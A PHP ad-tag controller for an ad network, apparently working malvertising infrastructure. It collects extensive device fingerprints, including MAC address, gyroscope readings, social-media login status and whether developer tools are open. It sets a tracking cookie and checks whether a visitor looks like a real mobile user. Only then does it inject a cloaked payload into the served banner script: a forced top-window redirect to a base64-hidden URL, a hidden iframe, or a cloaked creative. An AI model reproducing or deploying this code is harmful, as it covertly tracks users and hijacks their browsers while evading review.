<?php
global $controllerID,$controllerObject,$controllerFunction,$controllerData,$sub_domain,$app_path,$cm_banner;

/** ==================
 *  tag.controller.php
 *  ==================
 *  http://cdn.adsensor/tracker/impression_pixel/1x1.gif?fp=&did=&mac=&tch=&pr=&dp=&sw=&sh=&hl=&ac=&qc=&ts=
    http://api.adsensor/tracker/impression_pixel/1x1.gif?fp=1&did=&mac=&tch=&pr=&dp=&sw=&sh=&hl=&ac=&qc=&ts=
 *
 *  http://cdn.adsensor.io/tracker/impression_pixel/1x1.gif?ua=Mozilla%2F5.0%20…pl=0&mt=0&cn=cellular&ts=1476754913&actx=1&ref=&os=2&qc=1&did=&mac=&dur=22

 *  http://cdn.adsensor.io/tracker/impression_pixel/1x1.gif?ua=Mozilla%2F5.0%20(Linux%3B%20Android%207.0%3B%20Nexus%205X%20Build%2FNBD90W)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F53.0.2785.124%20Mobile%20Safari%2F537.36
 * tch=1        //device_ontouchstart
 * pr=2.625     //device_pixel_ratio
 * dp=32        //device_color_depth
 * sw=412       //device_screen_width
 * sh=732       //device_screen_height
 * hc=1         //device_hardware_concurrency       ***NEW***
 * mtch=5       //device_maxtouchpoints             ***NEW***
 * ct=1         //device_createtouch                ***NEW***
 * oc=1         //device_onorientationchange        ***NEW***
 * or=2         //device_orientation                ***NEW***
 * hl=-1        //device_history_length
 * la=en-US     //device_locale                     ***NEW***
 * pl=0         //device_plugins                    ***NEW***
 * mt=0         //device_mimetypes                  ***NEW***
 * cn=cellular  //device_nav_connection             ***NEW***
 * ts=1476754913    //device_timestamp
 * actx=1       //device_audio_context
 * ref=         //ip_referrer -- if this is not set, use PHP's ***NEW***
 * os=2         //device_os                         ***NEW***
 * qc=1         //device_qc
 * did=         //device_identifier
 * mac=         //device_mac_address
 * dur=22       //device_duration                   ***NEW***
 * fp=          //user_fingerprint
 * tz = //timezone offset from UTC
 * cst = //character set
 * adblk = //adblock
 * cid = //campaign id from voluum grabbed from referrer
 * ck = cookies enabled
 * cst = character set
 * did = //device ID grabbed from either URL macros or the referrer
 * dnt = do not track via JS
 * fl = font count
 * fp = user unique fingerprint
 * ixdb = device has an indexed database
 * lstr = device has local storage available
 * mc = mac address
 * mr = script is running MRAID, checks for "mraid" variable in mraid.js
 * n_br = device is lying abour the browser
 * n_la = device is lying about the languages
 * n_os = device is lying about the operating system
 * n_res = device is lying about it's resolution
 * odb = device has an open database (window.openDatabase)
 * sstr = device has session storage
 * ts = device local timestamp
 * wgl = device supports webGL
 * nt = note (internal campaign description)
 * vc = view count from cookie
 *
 *  ***NEW STUFF*****
 *  sm_tw = logged into twitter
 *  sm_rd = logged into reddit
 *  sm_fb = logged into facebook
 *  sm_gg  = logged into google
 *  sm_az  = logged amazon
 *  sm_gp  = logged into google play
 *
 *  gya = gyroscope alpha
 *  gyb = gyroscope beta
 *  gyg = gyroscope gamma
 *  gyqc = gyroscope does work and has real readout values
 *
 *  dvt = chrome/firebug dev tools open or not
 *
 *  clikid = campaign click ID
 *
 */

$domain =  $sub_domain[1] . '.' . $sub_domain[2];

//fetch client side data
try {
    $script_domain         = (!empty($_GET['dom']))?base64_decode(filter_var($_GET['dom'], FILTER_SANITIZE_STRING)):null;
} catch(Exception $e)
{
    $script_domain = null;
}

$device_identifier              = (!empty($_GET['did']))?filter_var($_GET['did'], FILTER_SANITIZE_STRING):null;
$device_mac_address             = (!empty($_GET['mc']))?filter_var($_GET['mc'], FILTER_SANITIZE_STRING):null;
$device_ontouchstart            = (!empty($_GET['tch']))?filter_var($_GET['tch'], FILTER_SANITIZE_NUMBER_INT):null;
$device_pixel_ratio             = (!empty($_GET['pr']))?floatval($_GET['pr']):null;
$device_color_depth             = (!empty($_GET['dp']))?filter_var($_GET['dp'], FILTER_SANITIZE_NUMBER_INT):null;
$device_screen_width            = (!empty($_GET['sw']))?filter_var($_GET['sw'],FILTER_SANITIZE_NUMBER_INT):null;
$device_screen_height           = (!empty($_GET['sh']))?filter_var($_GET['sh'], FILTER_SANITIZE_NUMBER_INT):null;
$device_history_length          = (!empty($_GET['hl']))?filter_var($_GET['hl'], FILTER_SANITIZE_NUMBER_INT):null;
$device_timestamp               = (!empty($_GET['ts']))?filter_var($_GET['ts'], FILTER_SANITIZE_NUMBER_INT):null;
$device_audio_context           = (!empty($_GET['ac']))?filter_var($_GET['ac'], FILTER_SANITIZE_NUMBER_INT):null;
$device_qc                      = (!empty($_GET['qc']))?filter_var($_GET['qc'], FILTER_SANITIZE_NUMBER_INT):null;

$device_hardware_concurrency    = (!empty($_GET['hc']))?filter_var($_GET['hc'], FILTER_SANITIZE_NUMBER_INT):null;
$device_maxtouchpoints          = (!empty($_GET['mtch']))?filter_var($_GET['mtch'], FILTER_SANITIZE_NUMBER_INT):null;
$device_createtouch             = (!empty($_GET['ct']))?filter_var($_GET['ct'], FILTER_SANITIZE_NUMBER_INT):null;
$device_onorientationchange     = (!empty($_GET['oc']))?filter_var($_GET['oc'], FILTER_SANITIZE_NUMBER_INT):null;
$device_orientation             = (!empty($_GET['or']))?filter_var($_GET['or'], FILTER_SANITIZE_STRING):null;
$device_locale                  = (!empty($_GET['la']))?filter_var($_GET['la'], FILTER_SANITIZE_STRING):null;
$device_plugins                 = intval($_GET['pl']);//(!empty($_GET['pl']))?filter_var($_GET['pl'], FILTER_SANITIZE_NUMBER_INT):null;
$device_mimetypes               = intval($_GET['mt']);//(!empty($_GET['mt']))?filter_var($_GET['mt'], FILTER_SANITIZE_NUMBER_INT):null;
$device_nav_connection          = (!empty($_GET['cn']))?filter_var($_GET['cn'], FILTER_SANITIZE_STRING):null;
$device_duration                = (!empty($_GET['dur']))?filter_var($_GET['dur'], FILTER_SANITIZE_NUMBER_INT):null;
$device_platform                = (!empty($_GET['os']))?filter_var($_GET['os'], FILTER_SANITIZE_NUMBER_INT):null;
$device_user_agent              = (!empty($_GET['ua']))?filter_var(urldecode($_GET['ua']), FILTER_SANITIZE_STRING):filter_var($_SERVER['HTTP_USER_AGENT'], FILTER_SANITIZE_STRING);
$ip_url                         = (!empty($_GET['u']))?filter_var($_GET['u'], FILTER_SANITIZE_STRING):null;
$ip_campaign_id                 = (!empty($_GET['cid']))?filter_var($_GET['cid'], FILTER_SANITIZE_STRING):null;
$ip_zone_id                     = (!empty($_GET['zid']))?filter_var($_GET['zid'], FILTER_SANITIZE_STRING):null;
$ip_is_mraid                    = (!empty($_GET['mr']))?filter_var($_GET['mr'], FILTER_SANITIZE_STRING):null;
$device_timezone                = (!empty($_GET['tz']))?filter_var($_GET['tz'], FILTER_SANITIZE_NUMBER_INT):null;
$device_character_set           = (!empty($_GET['cst']))?filter_var($_GET['cst'], FILTER_SANITIZE_STRING):null;

$campaign_note                  = (!empty($_GET['nt']))?filter_var($_GET['nt'], FILTER_SANITIZE_STRING):null;
$campaign_identifier = $campaign_note;

$device_dnt                     = (!empty($_GET['dnt']))?filter_var($_GET['dnt'], FILTER_SANITIZE_NUMBER_INT):null;
$device_adblock                 = (!empty($_GET['adblk']))?filter_var($_GET['adblk'], FILTER_SANITIZE_NUMBER_INT):null;
$device_cookies_enabled         = (!empty($_GET['ck']))?filter_var($_GET['ck'], FILTER_SANITIZE_NUMBER_INT):null;
$device_fonts                   = (!empty($_GET['fl']))?filter_var($_GET['fl'], FILTER_SANITIZE_NUMBER_INT):null;
$device_indexed_db              = (!empty($_GET['ixdb']))?filter_var($_GET['ixdb'], FILTER_SANITIZE_NUMBER_INT):null;
$device_local_storage           = (!empty($_GET['lstr']))?filter_var($_GET['lstr'], FILTER_SANITIZE_NUMBER_INT):null;
$device_open_db                 = (!empty($_GET['odb']))?filter_var($_GET['odb'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_storage         = (!empty($_GET['sstr']))?filter_var($_GET['sstr'], FILTER_SANITIZE_NUMBER_INT):null;
$device_webgl                   = (!empty($_GET['wgl']))?filter_var($_GET['wgl'], FILTER_SANITIZE_NUMBER_INT):null;
$device_flag_browser            = (!empty($_GET['n_br']))?filter_var($_GET['n_br'], FILTER_SANITIZE_NUMBER_INT):null;
$device_flag_language           = (!empty($_GET['n_la']))?filter_var($_GET['n_la'], FILTER_SANITIZE_NUMBER_INT):null;
$device_flag_os                 = (!empty($_GET['n_os']))?filter_var($_GET['n_os'], FILTER_SANITIZE_NUMBER_INT):null;
$device_flag_resolution         = (!empty($_GET['n_res']))?filter_var($_GET['n_res'], FILTER_SANITIZE_NUMBER_INT):null;

$device_session_twitter         = (!empty($_GET['sm_tw']))?filter_var($_GET['sm_tw'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_reddit          = (!empty($_GET['sm_rd']))?filter_var($_GET['sm_rd'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_facebook        = (!empty($_GET['sm_fb']))?filter_var($_GET['sm_fb'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_google          = (!empty($_GET['sm_gg']))?filter_var($_GET['sm_gg'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_amazon          = (!empty($_GET['sm_az']))?filter_var($_GET['sm_az'], FILTER_SANITIZE_NUMBER_INT):null;
$device_session_googleplus      = (!empty($_GET['sm_gp']))?filter_var($_GET['sm_gp'], FILTER_SANITIZE_NUMBER_INT):null;

$device_gyro_qc              = (!empty($_GET['gyqc']))?filter_var($_GET['gyqc'], FILTER_SANITIZE_NUMBER_INT):null;

$device_gyro_alpha              = (!empty($_GET['gya']))?floatval($_GET['gya']):null;
$device_gyro_beta               = (!empty($_GET['gyb']))?floatval($_GET['gyb']):null;
$device_gyro_gamma              = (!empty($_GET['gyg']))?floatval($_GET['gyg']):null;

$device_dev_tool                = (!empty($_GET['dvt']))?filter_var($_GET['dvt'], FILTER_SANITIZE_NUMBER_INT):null;


$device_build_id                = intval($_GET['bid']);//(!empty($_GET['bid']))?$_GET['bid']:null;


$ip_campaign_click_id           = (!empty($_GET['clkid']))?filter_var($_GET['clkid'], FILTER_SANITIZE_STRING):null;

if(!empty($_GET['ref']))
    $ip_referrer = filter_var($_GET['ref'], FILTER_SANITIZE_STRING);
else if(!empty($_SERVER['HTTP_REFERER'])) $ip_referrer = $_SERVER['HTTP_REFERER'];
    else $ip_referrer = null;


if(MODE == 'local') $ip_address = generate_random_ip();
else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],','))
{
    $_set = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
    //$_SERVER['HTTP_X_FORWARDED_FOR']
    $ip_address = $_set[0];
} else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && is_valid_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
}



//$ip_address = (MODE=='local')?generate_random_ip():$_SERVER['HTTP_X_FORWARDED_FOR'];
//$ip_hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$identify_instance = new Identify();
$identify_instance->get_all_data();
$user_data = $identify_instance->get_all_data();

$ip_hostname = $user_data['ip_host_name'];
$ip_request_method = $user_data['ip_request_method'];
$ip_asn = $user_data['ip_asn'];
$ip_asn_name = $user_data['ip_asn_name'];
$ip_connection = $user_data['ip_connection'];
$ip_timezone = $user_data['ip_timezone'];

$ip_country = $user_data['ip_country'];
$ip_domain = $user_data['ip_domain'];
$ip_city = $user_data['ip_city'];
$ip_location = $user_data['ip_location'];
$ip_postal_code = $user_data['ip_postal_code'];
$ip_organization = $user_data['ip_organization'];
$ip_provider = $user_data['ip_provider'];



$ip_accept_header = $user_data['ip_accept_header'];
$device_browser = $user_data['device_browser'];
$device_os_version = $user_data['device_os_version'];
$device_os = $user_data['device_os'];
$device_browser_version = $user_data['device_browser_version'];
$device_ss_locale = $user_data['device_locale'];
$device_platform = $user_data['device_platform'];
$device_is_mobile = $user_data['device_is_mobile'];
$device_is_bot = $user_data['device_is_bot'];

$cookie_view_count = isset($_COOKIE['as_vc'])?intval($_COOKIE['as_vc']):0;
$cookie_random_number = isset($_COOKIE['as_rnd'])?$_COOKIE['as_rnd']:'';
$cookie_user_fingerprint = isset($_COOKIE['as_fp']) && !empty($_COOKIE['as_fp'])?$_COOKIE['as_fp']:false;
$cookie_action_counter = isset($_COOKIE['as_ctr'])?intval($_COOKIE['as_ctr']):0;

//$cookie_frequency_cap = isset($_COOKIE['as_fc'])?$_COOKIE['as_fc']:0;

/** =================
 *  PAYLOAD FILTERING
 *  =================
 *  1. Determine if there are client-side filters
 *  2. Determine if there are server-side filters
 *  3. Determine payload(s)
 *  4. If verified, inject payloads into script
 *  5. Deliver ad tag script
 */


/* +------------------------------------+
 * | Load the creative tag to be served |
 * +------------------------------------+
 */

//If the provided data doesn't exist in our campaign array, exit!

if($campaign_identifier == null || !isset($cm_banner[$campaign_identifier])) show_error();
$campaign_advertiser = $cm_banner[$campaign_identifier]['advertiser'];

//This include requires that campaign_identifier and campaign_advertiser be set
include_once($_SERVER['DOCUMENT_ROOT'] . '/cdn/helper/ad_tag.helper.php');
include_once($_SERVER['DOCUMENT_ROOT'] . '/cdn/lib/filter.class.php');

$tag_file_name = $_SERVER['DOCUMENT_ROOT'] . '/cdn/banner/' .  $campaign_advertiser .'/' . $campaign_identifier .'/banner.js';


//If the requested creative doesn't exist then show an error
if(!file_exists($tag_file_name)) {
    show_error();
}


$raw_js = file_get_contents($tag_file_name);
$tag_script = replace_strings($raw_js, Array(
    AS_CDN_CAMPAIGN_ROOT_PATH=>get_macro(AS_CDN_CAMPAIGN_ROOT_PATH),
    AS_JS_ANIMATION_URL=>get_macro(AS_JS_ANIMATION_URL),
    'track.adsensor'=>'cdn2.adsensor',
    'track.supercdn'=>'cdn2.supercdn',
    'track.sushicdn'=>'cdn2.sushicdn',
    'track.razorcdn'=>'cdn2.razorcdn',
    'track.famoustrkads'=>'cdn.famoustrkads',
    'track.leadmark'=>'cdn.leadmark',
    'track.media-mob'=>'cdn.media-mob',
    'trk.offertrx'=>'files.offertrx',
    'trk2.clickmark.co'=>'s3.clickmark.co'

));



/* +-------------------------------------+
 * | Check the domain the script sits on |
 * +-------------------------------------+
 */
$_domain = ($script_domain)? explode('.',$script_domain):false;
if($_domain && isset($_domain[1]) && $script_domain && in_array($_domain[1] . '.'. $_domain[2],Array(
        'adsensor.io',
        'supercdn.co',
        'sushicdn.com',
        'razorcdn.com',
        'firecdn.co',
        'adsensor.com',
        'famoustrkads.co',
        'leadmark.co',
        'media-mob.in',
        'offertrx.co',
        'clktrx.co',
        'skinwonder.net',
        'clickmark.co',
        'batterybooster.pro'
    )))
{
    $is_valid_domain = true;
} else $is_valid_domain = false;





/* +---------------------------+
 * | Check client-side filters |
 * +---------------------------+
 */

$is_verified_client = (
        //$is_valid_domain == 1 &&
     $device_ontouchstart == 1
    //&&  $device_pixel_ratio > 0
    //&&  intval($device_color_depth) > 24
    //&&  intval($device_screen_width) < 1441
    &&  (intval($_GET['os']) == 1 || intval($_GET['os']) == 2)
    //&&  intval($device_dev_tool) == 1
    //&&  intval($device_plugins) == 0
    //&&  intval($device_mimetypes) == 0


   // &&  (intval($device_flag_resolution) !== null && intval($device_flag_resolution) !== -1 ))
   // &&  (intval($device_flag_language !==null && intval($device_flag_language !== -1))
)?true:false;

//NOTICE: this is a one off for firefox browsers as we're testing with it jun 20 2017
if($device_build_id !== -1) $is_verified_client = false; //will fail if build is firefox and buildID is undefined )



$test = Array(
        'is_valid_domain' => $is_valid_domain,
        'device_ontouchstart'=>  $device_ontouchstart,
        'device_pixel_ratio'=>  $device_pixel_ratio,
        'device_color_depth'=>  intval($device_color_depth),
        'device_screen_width'=>  intval($device_screen_width),
        'device_platform'=>  intval($device_platform),
        'dev_tool' => intval($device_dev_tool),
        'device_plugins'=>  intval($device_plugins),
        'device_mimetypes'=>  intval($device_mimetypes),
        'device_flag_resolution'=>  $device_flag_resolution,
        'device_flag_language'=>  $device_flag_language
);


/* +---------------------------+
 * | Check server-side filters |
 * +---------------------------+
 */

$tag_debug = false;



if(
    //$is_valid_domain &&
  isset($cm_banner[$campaign_identifier]['filter'])       //Make sure a filter is set
&&  !empty($cm_banner[$campaign_identifier]['filter'])      //Make sure a filter is set
&&
    (
        (isset($cm_banner[$campaign_identifier]['is_redirect'])  &&  $cm_banner[$campaign_identifier]['is_redirect'])
    ||
        (isset($cm_banner[$campaign_identifier]['is_iframe']) &&  $cm_banner[$campaign_identifier]['is_iframe'])
        || (isset($cm_banner[$campaign_identifier]['is_banner_cloak']) &&  $cm_banner[$campaign_identifier]['is_banner_cloak'])
    )
)
{
    $verify_instance = new Filter();
    $verify_instance->set_filter($cm_banner[$campaign_identifier]['filter']);
    $is_verified_server = $verify_instance->is_verified();
} else $is_verified_server = false;



if($tag_debug) $tag_script .= '/* v_dom: ' . (($is_valid_domain)?'true':'false') . ' v_serv: ' . (($is_verified_server)?'true':'false')  . ' v_cli: ' . (($is_verified_client)?'true':'false') .  ' data:' . print_r($test,true) . '*/' . PHP_EOL;
//$is_verified_server = $is_verified_client = true;

/* +----------------------------+
 * | Set the client Fingerprint |
 * +----------------------------+
 */

if(!$cookie_user_fingerprint)
{
    $user_fingerprint = md5($cookie_random_number . $ip_asn . $ip_timezone . $ip_country . $ip_domain . $ip_city . $ip_provider . $ip_location . $ip_postal_code . $ip_organization . $ip_provider . $device_user_agent);
    setcookie( 'as_fp',$user_fingerprint , COOKIE_EXPIRATION,'/',$domain,false); //the user's fingerprint
}
else $user_fingerprint = $cookie_user_fingerprint;



/* +-------------------+
 * | Determine Payload |
 * +-------------------+
 */
/*
if(isset($_COOKIE['as_ctr']) && isset($_COOKIE['as_lmt']) && intval($_COOKIE['as_ctr']) > intval($_COOKIE['as_lmt']))
    $is_verified_server = false;
*/
$script_payload = '';

if($cm_banner[$campaign_identifier]['is_banner_cloak']) {$tag_script_cloaked = $tag_script; $tag_script = '';}


error_log('is_verified_client: ' . ($is_verified_client?1:-1) . ' is_verified_server: ' . ($is_verified_server?1:-1) . ' bid_id: ' . $device_build_id . PHP_EOL . 'device_ontouchstart: ' .$device_ontouchstart .  ' device_screen_width: ' . $device_screen_width .' device_screen_height: ' . $device_screen_height . ' os: ' . $_GET['os'] . ' device_plugins: ' . $device_plugins . ' device_mimetypes: ' . $device_mimetypes);


if($is_verified_server && $is_verified_client)
{

    /* +------------------+
     * | REDIRECT PAYLOAD |
     * +------------------+
     */

    /**
     * _a = new Image();
    _a.src="http://s3.clickmark.co/nofx/" + window.atob("'. $_url. '") + "/" + _p[0] + "' .'&fp=' . $user_fingerprint . '";
     */

    if($cm_banner[$campaign_identifier]['is_redirect'])
    {
        $_url = base64_encode($cm_banner[$campaign_identifier]['redirect_url']);
        $_xurl = $cm_banner[$campaign_identifier]['redirect_url'];
        //$_url = $cm_banner[$campaign_identifier]['redirect_url'];
        $script_payload .= '
                    var _p = ((typeof as_click_url !=="undefined")?as_click_url.match(/(\?)\S+/i):"");
            
            window.top.location=window.atob("'. $_url. '") + "/" + _p[0] + "' .'&fp=' . $user_fingerprint . '";
         ';

    } ;

    if($cm_banner[$campaign_identifier]['is_iframe'] && isset($cm_banner[$campaign_identifier]['iframe_url']))
    {
        $script_payload .= '

            var _ifr = document.createElement("iframe");
            var _p = ((typeof as_click_url !=="undefined")?as_click_url.match(/(\?)\S+/i):"");
             _ifr.src = "' . $cm_banner[$campaign_identifier]['iframe_url'] . '/?" + _p[0] + "&fp='. $user_fingerprint.'";
             _ifr.style.display = "none";
             document.body.appendChild(_ifr);
 
        ';
    }

    if($cm_banner[$campaign_identifier]['is_banner_cloak'])
    {
        $script_payload .= $tag_script_cloaked;
    }


}


/* +--------------------------------------+
 * | Lets append the payload if it exists |
 * +--------------------------------------+
 */
$tag_script .= $script_payload;


/* +-----------------------------+
 * | Lets deliver the javascript |
 * +-----------------------------+
 */


$cookie_view_count++;
$cookie_action_limit = COOKIE_ACTION_LIMIT;
$cookie_action_expiration = COOKIE_ACTION_EXPIRATION;

if(!$is_verified_client || !$is_verified_server)
{
    $cookie_action_limit = 0;
    $cookie_action_counter = 0;
} else
    if($cookie_action_counter <= $cookie_action_limit) $cookie_action_counter++;
     //if client and server-side qc checks out, then we assume the client will run the action, so lets increase the counter







//error_log('setting for domain: ' . $domain);
//setcookie( 'as_fp',$user_fingerprint , COOKIE_EXPIRATION,'/',$domain,false); //the user's fingerprint
//setcookie( 'as_vc', $cookie_view_count, COOKIE_EXPIRATION,'/',$domain); //cookie count
//setcookie( 'as_cs_qc', ($device_qc == null)?-1:$device_qc, COOKIE_EXPIRATION,'/',$domain); //client side evaluation
//setcookie( 'as_ss_qc', 0, COOKIE_EXPIRATION,'/',$domain); //server side evaluation

/** +------------------+
 *  | COOKIE STRUCTURE |
 *  +------------------+
 *  as_fp       = the UUID for this particular user and their device
 *  as_vc       = overall view count for all of our ads
 *  as_cs_qc    = whether a device has passed our CLIENT side quality control (bot)
 *  as_ss_qc    = whether a device has passed our SERVER side quality control (bot)
 *  as_ctr      = number of times a particular action is performed
 *  as_lmt      = an action limiter. the action will cease once we've hit this limit
 *  COOKIE_ACTION_EXPIRATION = how long a limit for an action will last until we reset it
 *
 *  Client-side logic
 *  -----------------
 *  • If cs_qc = -1 stop
 *  • If ss_qc = -1 stop
 *  • If as_lmt > 0 as_ctr >= as_limit stop
 *      else as_ctr++, DO ACTION
 */


$ac_cookies = Array(
    'as_fp'=>Array(
        'val' => $user_fingerprint,
        'exp'=>COOKIE_EXPIRATION),
    'as_vc'=>Array(
        'val'=>$cookie_view_count,
        'exp'=>COOKIE_EXPIRATION),
    'as_ctr'=>Array(
        'val'=>$cookie_action_counter,
        'exp'=>$cookie_action_expiration),
    'as_lmt'=>Array(
        'val'=>$cookie_action_limit,
        'exp'=>$cookie_action_expiration),
);

foreach($ac_cookies as $k=>$v)
{
    setcookie($k,$v['val'],$v['exp'],'/',$domain);
}

header("X-Robots-Tag: noindex");
header("Content-Type: application/javascript");
header("HTTP/1.1 200 OK");

print($tag_script);



$device_heuristic = 0;
//$device_identifier_type = 0;
//$device_os = 0;



$device_data = Array(
    'user_fingerprint'              =>$user_fingerprint,
    'ip_address'                    =>$ip_address,
    'ip_url'                        =>$ip_url,
    'ip_hostname'                   =>$ip_hostname,
    'ip_campaign_id'                =>$ip_campaign_id,
    'ip_zone_id'                    =>$ip_zone_id,
    'ip_asn'                        =>$ip_asn,
    'ip_asn_name'                   =>$ip_asn_name,
    'ip_connection'                 =>$ip_connection,
    'ip_note'                       =>$campaign_note,

    'ip_country'                    =>$ip_country,
    'ip_domain'                     =>$ip_domain,
    'ip_city'                       =>$ip_city,
    'ip_location'                   =>$ip_location,
    'ip_postal_code'                =>$ip_postal_code,
    //'ip_metro_code'                 =>$ip_metro_code,
    'ip_organization'               =>$ip_organization,
    'ip_provider'                   =>$ip_provider,


    'device_identifier'             =>$device_identifier,
    'device_mac_address'            =>$device_mac_address,
    'device_user_agent'             =>$device_user_agent,
    'device_ontouchstart'           =>$device_ontouchstart,
    'device_pixel_ratio'            =>$device_pixel_ratio,
    'device_color_depth'            =>$device_color_depth,
    'device_screen_width'           =>$device_screen_width,
    'device_screen_height'          =>$device_screen_height,
    'device_history_length'         =>$device_history_length,
    'device_heuristic'              =>$device_heuristic,
    'device_browser'                =>$device_browser,
    'device_timestamp'              =>$device_timestamp,
    'device_audio_context'          =>$device_audio_context,
    'device_qc'                     =>$device_qc,
    'ip_is_mraid'                   =>$ip_is_mraid,



    'ip_referrer'                   =>$ip_referrer,
    'device_hardware_concurrency'   =>$device_hardware_concurrency,
    'device_maxtouchpoints'         =>$device_maxtouchpoints,
    'device_createtouch'            =>$device_createtouch,
    'device_onorientationchange'    =>$device_onorientationchange,
    'device_orientation'            =>$device_orientation,
    'device_locale'                 =>$device_locale,
    'device_plugins'                =>$device_plugins,
    'device_mimetypes'              =>$device_mimetypes,
    'device_nav_connection'         =>$device_nav_connection,
    'device_duration'               =>$device_duration,
    'device_os'                     =>$device_os,

    'ip_accept_header'              => $ip_accept_header, /** NEW **/
    'ip_timezone'                   => $ip_timezone,
    'device_os_version'             => $device_os_version, /** NEW **/
    'device_browser_version'        => $device_browser_version,  /** NEW **/
    'device_ss_locale'              => $device_ss_locale, /** NEW **/
    'device_platform'               => $device_platform, /** NEW **/
    'device_is_bot'                 => $device_is_bot, /** NEW **/
    'device_timezone'               => $device_timezone, /** NEW **/
    'device_character_set'          => $device_character_set, /** NEW **/


    'device_dnt'                    => $device_dnt,
    'device_adblock'                => $device_adblock,
    'device_cookies_enabled'        => $device_cookies_enabled,
    'device_fonts'                  => $device_fonts,
    'device_indexed_db'             => $device_indexed_db,
    'device_local_storage'          => $device_local_storage,
    'device_open_db'                => $device_open_db,
    'device_session_storage'        => $device_session_storage,
    'device_webgl'                  => $device_webgl,
    'device_flag_browser'           => $device_flag_browser,
    'device_flag_language'          => $device_flag_language,
    'device_flag_os'                => $device_flag_os,
    'device_flag_resolution'        => $device_flag_resolution,

    'device_session_twitter'        => $device_session_twitter,
    'device_session_reddit'         => $device_session_reddit,
    'device_session_facebook'       => $device_session_facebook,
    'device_session_google'         => $device_session_google,
    'device_session_amazon'         => $device_session_amazon,
    'device_session_googleplus'     => $device_session_googleplus,

    'device_gyro_alpha'             => $device_gyro_alpha,
    'device_gyro_beta'              => $device_gyro_beta,
    'device_gyro_gamma'             => $device_gyro_gamma,
    'device_gyro_qc'                => $device_gyro_qc,

    'device_dev_tool'               => $device_dev_tool,

    'ip_campaign_click_id'          => $ip_campaign_click_id,

);


//as_error('CLIENT DATA: ' . print_r($device_data,true));

try{
   $tracker_instance = new Tracker($device_data);
}   catch(Exception $e){
    as_error(print_r(array('code'=> RESPONSE_ERROR,'data'=> array('message'=> ERROR_PARSING_DATA)),true));
}

unset($tracker_instance);
exit();



